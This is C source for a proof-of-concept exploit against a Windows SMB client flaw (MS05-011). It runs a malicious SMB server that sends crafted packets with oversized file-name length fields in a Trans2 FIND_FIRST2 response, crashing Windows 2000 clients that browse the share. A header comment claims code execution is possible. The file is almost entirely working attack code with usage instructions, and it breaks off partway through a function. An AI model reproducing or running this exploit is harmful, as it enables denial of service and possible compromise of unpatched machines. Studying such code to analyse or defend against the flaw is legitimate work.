/*
 * Windows SMB Client Transaction Response Handling
 *
 * MS05-011
 * CAN-2005-0045
 *
 * This works against Win2k
 *
 * cybertronic[at]gmx[dot]net
 * http://www.livejournal.com/users/cybertronic/
 *
 * usage:
 * gcc -o mssmb_poc mssmb_poc.c
 * ./mssmb_poc
 *
 * connect via \\ip
 * and hit the netbios folder!
 *
 * ***STOP: 0x00000050 (0xF115B000,0x00000001,0xFAF24690,
 *                      0x00000000)
 * PAGE_FAULT_IN_NONPAGED_AREA
 *
 * The Client reboots immediately
 *
 * Technical Details:
 * -----------------
 *
 * The driver MRXSMB.SYS is responsible for performing SMB
 * client operations and processing the responses returned
 * by an SMB server service. A number of important Windows
 * File Sharing operations, and all RPC-over-named-pipes,
 * use the SMB commands Trans (25h) and Trans2 (32h). A
 * malicious SMB server can respond with specially crafted
 * Transaction response data that will cause an overflow
 * wherever the data is handled, either in MRXSMB.SYS or
 * in client code to which it provides data. One example
 * would be if the
 *
 * file name length field
 *
 * and the
 *
 * short file name length field
 *
 * in a Trans2 FIND_FIRST2 response packet can be supplied
 * with inappropriately large values in order to cause an
 * excessive memcpy to occur when the data is handled.
 * In the case of these examples an attacker could leverage
 * file:// links, that when clicked by a remote user, would
 * lead to code execution.
 *
 */

#include
#include
#include
#include

#define PORT	445

unsigned char SmbNeg[] =
"\x00\x00\x00\x55"
"\xff\x53\x4d\x42"                 // SMB
"\x72"                             // SMB Command: Negotiate Protocol (0x72)
"\x00\x00\x00\x00"                 // NT Status: STATUS_SUCCESS (0x00000000)
"\x98"                             // Flags: 0x98
"\x53\xc8"                         // Flags2 : 0xc853
"\x00\x00"                         // Process ID High: 0
"\x00\x00\x00\x00\x00\x00\x00\x00" // Signature: 0000000000000000
"\x00\x00"                         // Reserved: 0000
"\x00\x00"                         // Tree ID: 0
"\xff\xfe"                         // Process ID: 65279
"\x00\x00"                         // User ID: 0
"\x00\x00"                         // Multiplex ID: 0
"\x11"                             // Word Count (WCT): 17
"\x05\x00"                         // Dialect Index: 5, greater than LANMAN2.1
"\x03"                             // Security Mode: 0x03
"\x0a\x00"                         // Max Mpx Count: 10
"\x01\x00"                         // Max VCs: 1
"\x04\x11\x00\x00"                 // Max Buffer Size: 4356
"\x00\x00\x01\x00"                 // Max Raw Buffer 65536
"\x00\x00\x00\x00"                 // Session Key: 0x00000000
"\xfd\xe3\x00\x80"                 // Capabilities: 0x8000e3fd
"\x52\xa2\x4e\x73\xcb\x75\xc5\x01" // System Time: Jun 20, 2005 12:08:32.327125000
"\x88\xff"                         // Server Time Zone: /120 min from UTC
"\x00"                             // Key Length: 0
"\x10\x00"                         // Byte Count (BCC): 16
"\x9e\x12\xd7\x77\xd4\x59\x6c\x40" // Server GUID: 9E12D777D4596C40
"\xbc\xc0\xb4\x22\x40\x50\x01\xd4";//              BCC0B422405001D4

unsigned char SessionSetupAndXNeg[] = // Negotiate ERROR Response
"\x00\x00\x01\x1b"
"\xff\x53\x4d\x42\x73\x16\x00\x00\xc0\x98\x07\xc8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x04\xff\x00\x1b\x01\x00\x00\xa6\x00\xf0\x00\x4e\x54\x4c\x4d\x53"
"\x53\x50\x00\x02\x00\x00\x00\x12\x00\x12\x00\x30\x00\x00\x00\x15"
"\x82\x8a\xe0"
"\x00\x00\x00\x00\x00\x00\x00\x00" // NTLM Challenge
"\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x64\x00\x42\x00\x00\x00"
"\x53\x00\x45\x00\x52\x00\x56\x00\x49\x00\x43\x00\x45\x00\x50\x00"
"\x43\x00\x02\x00\x12\x00\x53\x00\x45\x00\x52\x00\x56\x00\x49\x00"
"\x43\x00\x45\x00\x50\x00\x43\x00\x01\x00\x12\x00\x53\x00\x45\x00"
"\x52\x00\x56\x00\x49\x00\x43\x00\x45\x00\x50\x00\x43\x00\x04\x00"
"\x12\x00\x73\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00"
"\x70\x00\x63\x00\x03\x00\x12\x00\x73\x00\x65\x00\x72\x00\x76\x00"
"\x69\x00\x63\x00\x65\x00\x70\x00\x63\x00\x06\x00\x04\x00\x01\x00"
"\x00\x00\x00\x00\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f"
"\x00\x77\x00\x73\x00\x20\x00\x35\x00\x2e\x00\x31\x00\x00\x00\x57"
"\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32"
"\x00\x30\x00\x30\x00\x30\x00\x20\x00\x4c\x00\x41\x00\x4e\x00\x20"
"\x00\x4d\x00\x61\x00\x6e\x00\x61\x00\x67\x00\x65\x00\x72\x00\x00";

unsigned char SessionSetupAndXAuth[] =
"\x00\x00\x00\x75"
"\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x04\xff\x00\x75\x00\x01\x00\x00\x00\x4a\x00\x4e\x57\x00\x69\x00"
"\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x35\x00\x2e\x00"
"\x31\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00"
"\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x4c\x00"
"\x41\x00\x4e\x00\x20\x00\x4d\x00\x61\x00\x6e\x00\x61\x00\x67\x00"
"\x65\x00\x72\x00\x00";

unsigned char TreeConnectAndX[] =
"\x00\x00\x00\x38"
"\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x07\xff\x00\x38\x00\x01\x00\xff\x01\x00\x00\xff\x01\x00\x00\x07"
"\x00\x49\x50\x43\x00\x00\x00\x00";

unsigned char SmbNtCreate [] =
"\x00\x00\x00\x87"
"\xff\x53\x4d\x42"                 // SMB
"\xa2"                             // SMB Command: NT Create AndX (0xa2)
"\x00\x00\x00\x00"                 // NT Status: STATUS_SUCCESS (0x00000000)
"\x98"                             // Flags: 0x98
"\x07\xc8"                         // Flags2 : 0xc807
"\x00\x00"                         // Process ID High: 0
"\x00\x00\x00\x00\x00\x00\x00\x00" // Signature: 0000000000000000
"\x00\x00"                         // Reserved: 0000
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // User ID: 0
"\x00\x00"                         // Multiplex ID: 0
"\x2a"                             // Word Count (WCT): 42
"\xff"                             // AndXCommand: No further commands (0xff)
"\x00"                             // Reserved: 00
"\x87\x00"                         // AndXOffset: 135
"\x00"                             // Oplock level: No oplock granted (0)
"\x00\x00"                         // FID: 0
"\x01\x00\x00\x00"                 // Create action: The file existed and was opened (1)
"\x00\x00\x00\x00\x00\x00\x00\x00" // Created: No time specified (0)
"\x00\x00\x00\x00\x00\x00\x00\x00" // Last Access: No time specified (0)
"\x00\x00\x00\x00\x00\x00\x00\x00" // Last Write: No time specified (0)
"\x00\x00\x00\x00\x00\x00\x00\x00" // Change: No time specified (0)
"\x80\x00\x00\x00"                 // File Attributes: 0x00000080
"\x00\x10\x00\x00\x00\x00\x00\x00" // Allocation Size: 4096
"\x00\x00\x00\x00\x00\x00\x00\x00" // End Of File: 0
"\x02\x00"                         // File Type: Named pipe in message mode (2)
"\xff\x05"                         // IPC State: 0x05ff
"\x00"                             // Is Directory: This is NOT a directory (0)
"\x00\x00"                         // Byte Count (BCC): 0

// crap
"\x00\x00\x00\x0f\x00\x00\x00\x00"
"\x00\x74\x7a\x4f\xac\x2d\xdf\xd9"
"\x11\xb9\x20\x00\x10\xdc\x9b\x01"
"\x12\x00\x9b\x01\x12\x00\x1b\xc2";

unsigned char DceRpc[] =
"\x00\x00\x00\x7c"
"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x0a\x00\x00\x44\x00\x00\x00\x00\x00\x38\x00\x00\x00\x44\x00\x38"
"\x00\x00\x00\x00\x00\x45\x00\x00\x05\x00\x0c\x03\x10\x00\x00\x00"
"\x44\x00\x00\x00\x01\x00\x00\x00\xb8\x10\xb8\x10"
"\x00\x00\x00\x00"                 // Assoc Group
"\x0d\x00\x5c\x50\x49\x50\x45\x5c"
"\x00\x00\x00"                     // srv or wks
"\x73\x76\x63\x00\xff\x01\x00\x00\x00\x00\x00\x00\x00\x04\x5d\x88"
"\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00"
"\x00";

unsigned char WksSvc[] =
"\x00\x00\x00\xb0"
"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x0a\x00\x00\x78\x00\x00\x00\x00\x00\x38\x00\x00\x00\x78\x00\x38"
"\x00\x00\x00\x00\x00\x79\x00\x00\x05\x00\x02\x03\x10\x00\x00\x00"
"\x78\x00\x00\x00\x01\x00\x00\x00\x60\x00\x00\x00\x00\x00\x00\x00"
"\x64\x00\x00\x00\xb8\x0f\x16\x00\xf4\x01\x00\x00\xe6\x0f\x16\x00"
"\xd2\x0f\x16\x00\x05\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x00\x00"
"\x00\x00\x00\x00\x0a\x00\x00\x00\x53\x00\x45\x00\x52\x00\x56\x00"
"\x49\x00\x43\x00\x45\x00\x50\x00\x43\x00\x00\x00\x0a\x00\x00\x00"
"\x00\x00\x00\x00\x0a\x00\x00\x00\x57\x00\x4f\x00\x52\x00\x4b\x00"
"\x47\x00\x52\x00\x4f\x00\x55\x00\x50\x00\x00\x00\x00\x00\x00\x00";

unsigned char SrvSvc[] =
"\x00\x00\x00\xac"
"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x0a\x00\x00\x74\x00\x00\x00\x00\x00\x38\x00\x00\x00\x74\x00\x38"
"\x00\x00\x00\x00\x00\x75\x00\x00\x05\x00\x02\x03\x10\x00\x00\x00"
"\x74\x00\x00\x00\x01\x00\x00\x00\x5c\x00\x00\x00\x00\x00\x00\x00"
"\x65\x00\x00\x00\x68\x3d\x14\x00\xf4\x01\x00\x00"
"\x80\x3d\x14\x00"                                                 // Server IP
"\x05\x00\x00\x00\x01\x00\x00\x00\x03\x10\x05\x00\x9c\x3d\x14\x00"
"\x0e\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00"
"\x31\x00\x39\x00\x32\x00\x2e\x00\x31\x00\x36\x00\x38\x00\x2e\x00" // Server IP ( UNICODE )
"\x32\x00\x2e\x00\x31\x00\x30\x00\x33\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x55\x00"
"\x00\x00\x00\x00";

unsigned char SmbClose[] =
"\x00\x00\x00\x23"
"\xff\x53\x4d\x42"                 // SMB
"\x04"                             // SMB Command: Close (0x04)
"\x00\x00\x00\x00"                 // NT Status: STATUS_SUCCESS (0x00000000)
"\x98"                             // Flags: 0x98
"\x07\xc8"                         // Flags2 : 0xc807
"\x00\x00"                         // Process ID High: 0
"\x00\x00\x00\x00\x00\x00\x00\x00" // Signature: 0000000000000000
"\x00\x00"                         // Reserved: 0000
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x00"                             // Word Count (WCT): 0
"\x00\x00";                        // Byte Count (BCC): 0

unsigned char NetrShareEnum[] =
"\x00\x00\x01\x90"
"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x0a\x00\x00\x58\x01\x00\x00\x00\x00\x38\x00\x00\x00\x58\x01\x38"
"\x00\x00\x00\x00\x00\x59\x01\x00\x05\x00\x02\x03\x10\x00\x00\x00"
"\x58\x01\x00\x00\x01\x00\x00\x00\x40\x01\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00\x01\x00\x00\x00\x54\x0a\x17\x00\x04\x00\x00\x00"
"\xa0\x28\x16\x00\x04\x00\x00\x00\x80\x48\x16\x00\x03\x00\x00\x80"
"\x8a\x48\x16\x00\x6e\x48\x16\x00\x00\x00\x00\x00\x7e\x48\x16\x00"
"\x48\x48\x16\x00\x00\x00\x00\x80\x56\x48\x16\x00\x20\x48\x16\x00"
"\x00\x00\x00\x80\x26\x48\x16\x00\x05\x00\x00\x00\x00\x00\x00\x00"
"\x05\x00\x00\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x36\x00"
"\x0b\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x52\x00\x65\x00"
"\x6d\x00\x6f\x00\x74\x00\x65\x00\x2d\x00\x49\x00\x50\x00\x43\x00"
"\x00\x00\x37\x00\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00"
"\x6e\x00\x65\x00\x74\x00\x62\x00\x69\x00\x6f\x00\x73\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
"\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x41\x00\x44\x00"
"\x4d\x00\x49\x00\x4e\x00\x24\x00\x00\x00\x00\x00\x0c\x00\x00\x00"
"\x00\x00\x00\x00\x0c\x00\x00\x00\x52\x00\x65\x00\x6d\x00\x6f\x00"
"\x74\x00\x65\x00\x61\x00\x64\x00\x6d\x00\x69\x00\x6e\x00\x00\x00"
"\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x43\x00\x24\x00"
"\x00\x00\x39\x00\x11\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00"
"\x53\x00\x74\x00\x61\x00\x6e\x00\x64\x00\x61\x00\x72\x00\x64\x00"
"\x66\x00\x72\x00\x65\x00\x69\x00\x67\x00\x61\x00\x62\x00\x65\x00"
"\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

unsigned char OpenPrinterEx[] =
"\x00\x00\x00\x68"
"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x0a\x00\x00\x30\x00\x00\x00\x00\x00\x38\x00\x00\x00\x30\x00\x38"
"\x00\x00\x00\x00\x00\x31\x00\x00\x05\x00\x02\x03\x10\x00\x00\x00"
"\x30\x00\x00\x00\x01\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x24\xd7\x9c\xf8\xbb\xe1\xd9\x11\xb9\x29\x00\x10"
"\xdc\x4a\x6b\xbb\x00\x00\x00\x00";

unsigned char ClosePrinter[] =
"\x00\x00\x00\x68"
"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x0a\x00\x00\x30\x00\x00\x00\x00\x00\x38\x00\x00\x00\x30\x00\x38"
"\x00\x00\x00\x00\x00\x31\x00\x00\x05\x00\x02\x03\x10\x00\x00\x00"
"\x30\x00\x00\x00\x02\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00";

unsigned char OpenHklm[] =
"\x00\x00\x00\x68"
"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x0a\x00\x00\x30\x00\x00\x00\x00\x00\x38\x00\x00\x00\x30\x00\x38"
"\x00\x00\x00\x00\x00\x31\x00\x00\x05\x00\x02\x03\x10\x00\x00\x00"
"\x30\x00\x00\x00\x01\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x4e\x4c\xb2\xf8\xbb\xe1\xd9\x11\xb9\x29\x00\x10"
"\xdc\x4a\x6b\xbb\x00\x00\x00\x00";

unsigned char OpenKey[] =
"\x00\x00\x00\x68"
"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x0a\x00\x00\x30\x00\x00\x00\x00\x00\x38\x00\x00\x00\x30\x00\x38"
"\x00\x00\x00\x00\x00\x31\x00\x00\x05\x00\x02\x03\x10\x00\x00\x00"
"\x30\x00\x00\x00\x02\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x05\x00\x00\x00";

unsigned char CloseKey[] =
"\x00\x00\x00\x68"
"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x0a\x00\x00\x30\x00\x00\x00\x00\x00\x38\x00\x00\x00\x30\x00\x38"
"\x00\x00\x00\x00\x00\x31\x00\x00\x05\x00\x02\x03\x10\x00\x00\x00"
"\x30\x00\x00\x00\x03\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00";

unsigned char NetBios1[] =
"\x00\x00\x00\x94"
"\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x0a\x00\x00\x5c\x00\x00\x00\x00\x00\x38\x00\x00\x00\x5c\x00\x38"
"\x00\x00\x00\x00\x00\x5d\x00\x00\x05\x00\x02\x03\x10\x00\x00\x00"
"\x5c\x00\x00\x00\x01\x00\x00\x00\x44\x00\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00\xc0\xa2\x16\x00\xae\xc2\x16\x00\x00\x00\x00\x00"
"\xbe\xc2\x16\x00\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00"
"\x6e\x00\x65\x00\x74\x00\x62\x00\x69\x00\x6f\x00\x73\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x2e\x00"
"\x00\x00\x00\x00";

unsigned char NetBios2[] =
"\x00\x00\x00\x3e"
"\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x98\x07\xc8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x07\xff\x00\x3e\x00\x01\x00\xff\x01\x00\x00\xff\x01\x00\x00\x0d"
"\x00\x41\x3a\x00\x4e\x00\x54\x00\x46\x00\x53\x00\x00\x00";

// Trans2 Response, QUERY_PATH_INFO
unsigned char Trans2Response1[] =
"\x00\x00\x00\x64"
"\xff\x53\x4d\x42"                 // SMB
"\x32"                             // SMB Command: Trans2 (0x32)
"\x00\x00\x00\x00"                 // NT Status: STATUS_SUCCESS (0x00000000)
"\x98"                             // Flags: 0x98
"\x07\xc8"                         // Flags2 : 0xc807
"\x00\x00"                         // Process ID High: 0
"\x00\x00\x00\x00\x00\x00\x00\x00" // Signature: 0000000000000000
"\x00\x00"                         // Reserved: 0000
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x0a"                             // Word Count (WCT): 10
"\x02\x00"                         // Total Parameter Count: 2
"\x28\x00"                         // Total Data Count: 40
"\x00\x00"                         // Reserved: 0000
"\x02\x00"                         // Parameter Count: 2
"\x38\x00"                         // Parameter Offset: 56
"\x00\x00"                         // Parameter Displacement: 0
"\x28\x00"                         // Data Count: 40
"\x3c\x00"                         // Data Offset: 60
"\x00\x00"                         // Data Displacement: 0
"\x00"                             // Setup Count: 0
"\x00"                             // Reserved: 00
"\x2d\x00"                         // Byte Count (BCC): 45
"\x00"                             // Padding: 00
"\x00\x00"                         // EA Error offset: 0
"\x00\x01"                         // Padding: 0001
"\xe8\x35\xcf\x94\x39\x73\xc5\x01" // Created: Jun 17, 2005 05:39:19.686500000
"\x8c\x24\xba\x5c\x3a\x73\xc5\x01" // Last Access: Jun 17, 2005 05:44:55.092750000
"\xe8\x35\xcf\x94\x39\x73\xc5\x01" // Last Write: Jun 17, 2005 05:39:19.686500000
"\x9c\x81\x67\x98\x39\x73\xc5\x01" // Change:  Jun 17, 2005 05:39:25.717750000
"\x10\x00\x00\x00"                 // File Attributes: 0x00000010
"\x00\x00\x00\x00";                // Unknown Data: 00000000

// Trans2 Response, QUERY_PATH_INFO
unsigned char Trans2Response2[] = // ERROR Response
"\x00\x00\x00\x23"
"\xff\x53\x4d\x42\x32\x34\x00\x00\xc0\x98\x07\xc8\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x00\x00\x00";

// Trans2 Response, FIND_FIRST2, Files: . ..
unsigned char Trans2Response3[] =
"\x00\x00\x01\x0c"
"\xff\x53\x4d\x42"                 // SMB
"\x32"                             // SMB Command: Trans2 (0x32)
"\x00\x00\x00\x00"                 // NT Status: STATUS_SUCCESS (0x00000000)
"\x98"                             // Flags: 0x98
"\x07\xc8"                         // Flags2 : 0xc807
"\x00\x00"                         // Process ID High: 0
"\x00\x00\x00\x00\x00\x00\x00\x00" // Signature: 0000000000000000
"\x00\x00"                         // Reserved: 0000
"\x00\x00"                         // Tree ID: 0
"\x00\x00"                         // Process ID: 0
"\x00\x00"                         // USER ID
"\x00\x00"                         // Multiplex ID: 0
"\x0a"                             // Word Count (WCT): 10
"\x0a\x00"                         // Total Parameter Count: 10
"\xc8\x00"                         // Total Data Count: 200
"\x00\x00"                         // Reserved: 0000
"\x0a\x00"                         // Parameter Count: 10
"\x38\x00"                         // Parameter Offset: 56
"\x00\x00"                         // Parameter Displacement: 0
"\xc8\x00"                         // Data Count: 200
"\x44\x00"                         // Data Offset: 68
"\x00\x00"                         // Data Displacement: 0
"\x00"                             // Setup Count: 0
"\x00"                             // Reserved: 00
"\xd5\x00"                         // Byte Count (BCC): 213
"\x00"                             // Padding: 00
"\x01\x08"                         // Search ID: 0x0801
"\x02\x00"                         // Seatch Count: 2
"\x01\x00"                         // End of Search: 1
"\x00\x00"                         // EA Error offset: 0
"\x60\x00"                         // Last Name offset: 96
"\x38\x00"                         // Padding: 3800
"\x60\x00\x00\x00"                 // Next Entry offset: 96
"\x00\x00\x00\x00"                 // File Index: 0
"\xe8\x35\xcf\x94\x39\x73\xc5\x01" // Created: Jun 17, 2005 05:39:19.686500000
"\xac\x09\x3c\xae\x39\x73\xc5\x01" // Last Access: Jun 17, 2005 05:40:02.342750000
"\xe8\x35\xcf\x94\x39\x73\xc5\x01" // Last Write: Jun 17, 2005 05:39:19.686500000
"\x9c\x81\x67\x98\x39\x73\xc5\x01" // Change:  Jun 17, 2005 05:39:25.717750000
"\x00\x00\x00\x00\x00\x00\x00\x00" // End of File: 0
"\x00\x00\x00\x00\x00\x00\x00\x00" // Allocation Size: 0
"\x10\x00\x00\x00"                 // File Attributes: 0x00000010
//"\x02\x00\x00\x00"               // File Name Len: 2
"\xff\xff\xff\xff"                 // Bad File Name Len
"\x00\x00\x00\x00"                 // EA List Length: 0
//"\x00"                           // Short File Name Len: 0
"\xff"                             // Bad Short File Name Len
"\x00"                             // Reserved: 00
"\x00\x00\x00\x00\x00\x00\x00\x00" // Short File Name:
"\x00\x00\x00\x00\x00\x00\x00\x00" // Short File Name:
"\x00\x00\x00\x00\x00\x00\x00\x00" // Short File Name:
"\x2e\x00"                         // File Name: .
"\x00\x00\x00\x00"                 // Next Entry Offset: 0
"\x00\x00\x00\x00"                 // File Index: 0
"\xe8\x35\xcf\x94\x39\x73\xc5\x01" // Created: Jun 17, 2005 05:39:19.686500000
"\xac\x09\x3c\xae\x39\x73\xc5\x01" // Last Access: Jun 17, 2005 05:40:02.342750000
"\xe8\x35\xcf\x94\x39\x73\xc5\x01" // Last Write: Jun 17, 2005 05:39:19.686500000
"\x9c\x81\x67\x98\x39\x73\xc5\x01" // Change:  Jun 17, 2005 05:39:25.717750000
"\x00\x00\x00\x00\x00\x00\x00\x00" // End Of File: 0
"\x00\x00\x00\x00\x00\x00\x00\x00" // Allocation Size: 0
"\x10\x00\x00\x00"                 // File Attributes: 0x00000010
"\x04\x00\x00\x00"                 // File Name Len: 4
"\x00\x00\x00\x00"                 // EA List Length: 0
"\x00"                             // Short File Name Len: 0
"\x00"                             // Reserved: 00
"\x00\x00\x00\x00\x00\x00\x00\x00" // Short File Name:
"\x00\x00\x00\x00\x00\x00\x00\x00" // Short File Name:
"\x00\x00\x00\x00\x00\x00\x00\x00" // Short File Name:
"\x2e\x00\x2e\x00"                 // File Name: ..
"\x00\x00\x00\x00\x00\x00";        // Unknown Data: 000000000000

int
check_interface ( char* str )
{
	int i, j, wks = 0, srv = 0, spl = 0, wrg = 0, foo = 0;

	//Interface UUID
	unsigned char wks_uuid[] = "\x98\xd0\xff\x6b\x12\xa1\x10\x36\x98\x33\x46\xc3\xf8\x7e\x34\x5a";
	unsigned char srv_uuid[] = "\xc8\x4f\x32\x4b\x70\x16\xd3\x01\x12\x78\x5a\x47\xbf\x6e\xe1\x88";
	unsigned char spl_uuid[] = "\x78\x56\x34\x12\x34\x12\xcd\xab\xef\x00\x01\x23\x45\x67\x89\xab";
	unsigned char wrg_uuid[] = "\x01\xd0\x8c\x33\x44\x22\xf1\x31\xaa\xaa\x90\x00\x38\x00\x10\x03";

	for ( i = 0; i < 16; i++ )
	{
		j = 0;
		if ( str[120 + i] < 0 )
		{
			if ( ( str[120 + i] + 0x100 ) == wks_uuid[i] )
				{ wks++; j = 1; }
			if ( ( str[120 + i] + 0x100 ) == srv_uuid[i] )
				{ srv++; j = 1; }
			if ( ( str[120 + i] + 0x100 ) == spl_uuid[i] )
				{ spl++; j = 1; }
			if ( ( str[120 + i] + 0x100 ) == wrg_uuid[i] )
				{ wrg++; j = 1; }
			if ( j == 0 )
				foo++;
		}
		else
		{
			if ( str[120 + i] == wks_uuid[i] )
				{ wks++; j = 1; }
			if ( str[120 + i] == srv_uuid[i] )
				{ srv++; j = 1; }
			if ( str[120 + i] == spl_uuid[i] )
				{ spl++; j = 1; }
			if ( str[120 + i] == wrg_uuid[i] )
				{ wrg++; j = 1; }
			if ( j == 0 )
				foo++;
		}
	}
	if ( wks == 16 )
		return ( 0 );
	else if ( srv == 16 )
		return ( 1 );
	else if ( spl == 16 )
		return ( 2 );
	else if ( wrg == 16 )
		return ( 3 );
	else
	{
		printf ( "there is/are %d invalid byte(s) in the interface UUID!\n", foo );
		return ( -1 );
	}
}

void
neg ( int s )
{
	char response[1024];

	bzero ( &response, sizeof ( response ) );
	recv ( s, response, sizeof ( response ) -1, 0 );

	send ( s, SmbNeg, sizeof ( SmbNeg ) -1, 0 );
}

void
sessionsetup ( int s, unsigned long userid, unsigned long treeid, int option )
{
	char response[1024];
